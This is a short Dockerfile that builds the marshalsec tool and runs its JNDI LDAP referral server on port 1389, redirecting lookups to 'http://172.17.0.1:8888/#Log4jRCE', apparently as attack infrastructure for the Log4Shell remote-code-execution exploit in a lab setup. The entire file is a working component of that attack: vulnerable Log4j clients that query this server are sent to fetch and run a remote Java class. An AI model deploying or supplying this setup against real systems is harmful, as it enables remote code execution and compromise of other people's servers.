FROM maven:3.6.2-jdk-8

WORKDIR /data

COPY . .

RUN mvn clean package -DskipTests

CMD java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Log4jRCE"
EXPOSE 1389


